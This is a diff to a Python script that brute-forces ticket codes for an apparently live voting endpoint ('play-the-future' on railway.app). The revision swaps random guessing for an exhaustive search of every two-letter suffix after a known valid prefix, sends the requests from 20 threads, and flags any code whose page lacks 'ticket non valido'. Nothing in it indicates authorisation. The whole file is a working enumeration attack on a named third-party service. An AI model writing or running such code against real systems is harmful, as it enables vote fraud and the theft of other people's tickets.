@@ -1,57 +1,63 @@
 #!/usr/bin/env python3
-import random
 import string
 import requests
+import itertools
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 BASE_URL = "https://play-the-future-vfu.up.railway.app/vote"
 CHARSET = string.ascii_uppercase  # A-Z only
-CODE_LENGTH = 8
-TOTAL_CODES = 100
-WORKERS = 10
 INVALID_MARKER = "ticket non valido"
+WORKERS = 20
 
-
-def random_code():
-    return "".join(random.choices(CHARSET, k=CODE_LENGTH))
+# --- Config ---
+KNOWN_PREFIX = "RXKPIY"          # fixed part we know is valid
+SUFFIX_LEN = 8 - len(KNOWN_PREFIX)  # brute-force remaining chars (2 → 676 combos)
 
 
 def check_code(code):
     url = f"{BASE_URL}/{code}"
     try:
         r = requests.get(url, timeout=10)
-        body = r.text.lower()
-        if INVALID_MARKER not in body:
-            return url, r.status_code, r.text[:200]
+        if INVALID_MARKER not in r.text.lower():
+            return url, r.status_code, r.text[:300]
     except requests.RequestException as e:
-        print(f"[ERR] {code}: {e}")
+        print(f"\n[ERR] {code}: {e}")
     return None
 
 
+def generate_candidates():
+    for suffix in itertools.product(CHARSET, repeat=SUFFIX_LEN):
+        yield KNOWN_PREFIX + "".join(suffix)
+
+
 def main():
-    codes = [random_code() for _ in range(TOTAL_CODES)]
+    candidates = list(generate_candidates())
+    total = len(candidates)
     valid = []
 
-    print(f"Testing {TOTAL_CODES} random {CODE_LENGTH}-char codes against {BASE_URL}\n")
+    print(f"Prefix fisso : {KNOWN_PREFIX}")
+    print(f"Suffix libero: {SUFFIX_LEN} char  →  {total} combinazioni totali")
+    print(f"Endpoint     : {BASE_URL}/<code>\n")
 
     with ThreadPoolExecutor(max_workers=WORKERS) as pool:
-        futures = {pool.submit(check_code, code): code for code in codes}
-        for i, future in enumerate(as_completed(futures), 1):
+        futures = {pool.submit(check_code, code): code for code in candidates}
+        done = 0
+        for future in as_completed(futures):
+            done += 1
             code = futures[future]
             result = future.result()
-            status = "VALID" if result else "."
-            print(f"[{i:3}/{TOTAL_CODES}] {code}  {status}", end="\r" if not result else "\n")
+            print(f"[{done:4}/{total}] {code}", end="\r")
             if result:
-                valid.append(result)
+                url, status, preview = result
+                valid.append(url)
+                print(f"\n  *** VALIDO ***  {url}  (HTTP {status})")
+                print(f"  Preview: {preview!r}\n")
 
-    print(f"\n\nRisultati: {len(valid)} ticket validi trovati su {TOTAL_CODES} testati")
+    print(f"\n\nCompletato: {len(valid)} ticket validi su {total} testati")
     if valid:
         print("\n--- Ticket validi ---")
-        for url, status_code, preview in valid:
-            print(f"  URL     : {url}")
-            print(f"  Status  : {status_code}")
-            print(f"  Preview : {preview!r}")
-            print()
+        for u in valid:
+            print(f"  {u}")
 
     return valid
 
